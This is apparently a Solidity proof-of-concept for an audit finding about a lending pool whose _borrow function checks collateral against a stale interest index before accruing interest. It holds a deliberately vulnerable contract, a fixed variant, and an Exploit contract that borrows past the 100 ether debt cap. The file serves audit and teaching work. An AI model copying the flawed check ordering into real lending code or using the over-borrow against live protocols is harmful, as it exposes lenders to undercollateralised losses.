// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum H-26 (Pashov, 2025-05-06).
    LendingPool._borrow calls _validateBorrow before ReserveLibrary
    updates the usage index. A 99 ether stale debt passes a 100 ether cap
    for a 1 ether borrow. One second of interest makes the true debt
    104.999... ether, and the new borrow leaves 105.999... ether against
    100 ether of collateral.
*/

contract Asset {
    string public symbol = "rTKN";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LendingPool {
    uint256 public constant RATE = 60606060606060606;
    uint256 public usageIndex = 1e18;
    uint256 public lastUpdateTimestamp;
    uint256 public constant maxDebt = 100 ether;
    mapping(address => uint256) public scaledDebt;
    Asset public asset;
    uint256 public borrowed;

    constructor(Asset _asset) {
        asset = _asset;
    }

    function setScaledDebt(address user, uint256 amount) external {
        scaledDebt[user] = amount;
    }

    function getPositionDebt(address user) public view returns (uint256) {
        return scaledDebt[user] * usageIndex / 1e18;
    }

    function _validateBorrow(uint256 amount) internal view {
        if (maxDebt < getPositionDebt(msg.sender) + amount) revert("NotEnoughCollateralToBorrow");
    }

    function updateReserveState() public {
        uint256 timeDelta = block.timestamp - lastUpdateTimestamp;
        if (timeDelta < 1) return;
        usageIndex = usageIndex * (1e18 + RATE * timeDelta) / 1e18;
        lastUpdateTimestamp = block.timestamp;
    }

    function _borrow(uint256 amount) external {
        // @> VULN: collateral is checked on the stale usage index, then interest accrues
        _validateBorrow(amount);
        updateReserveState();
        scaledDebt[msg.sender] += amount * 1e18 / usageIndex;
        borrowed = amount;
        asset.transfer(msg.sender, amount);
    }

    function _borrowFixed(uint256 amount) external {
        updateReserveState();
        _validateBorrow(amount);
        scaledDebt[msg.sender] += amount * 1e18 / usageIndex;
        borrowed = amount;
        asset.transfer(msg.sender, amount);
    }
}

contract Exploit {
    Asset public asset;
    LendingPool public pool;
    uint256 public debtAfter;
    uint256 public constant BORROW = 1 ether;

    constructor() {
        asset = new Asset();
        pool = new LendingPool(asset);
        pool.setScaledDebt(address(this), 99 ether);
        asset.mint(address(pool), 10 ether);
    }

    function run() external {
        require(block.timestamp >= 1, "time");
        require(pool.getPositionDebt(address(this)) == 99 ether, "stale");
        pool._borrow(BORROW);
        debtAfter = pool.getPositionDebt(address(this));
        require(debtAfter > pool.maxDebt(), "over");
        require(asset.balanceOf(address(this)) == BORROW, "got");
        require(pool.borrowed() == BORROW, "borrowed");
    }

    function runFixed() external {
        require(pool.getPositionDebt(address(this)) == 99 ether, "stale");
        pool.updateReserveState();
        require(pool.getPositionDebt(address(this)) > pool.maxDebt(), "accrued");
        try pool._borrowFixed(BORROW) {
            revert("should revert");
        } catch {}
        require(asset.balanceOf(address(this)) == 0, "none");
    }
}
